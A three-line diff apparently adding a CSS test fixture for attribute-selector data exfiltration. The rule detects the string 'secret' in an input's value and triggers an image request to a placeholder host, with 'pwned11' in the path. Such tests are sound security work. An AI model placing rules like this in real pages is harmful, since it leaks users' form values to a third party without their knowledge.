@@ -1,0 +1,3 @@
+#exfil_test11[value*="secret"] ~ #exfil_img11 {
+  background-image: url("https://app.example.test/src/;base64,pwned11.png");
+}
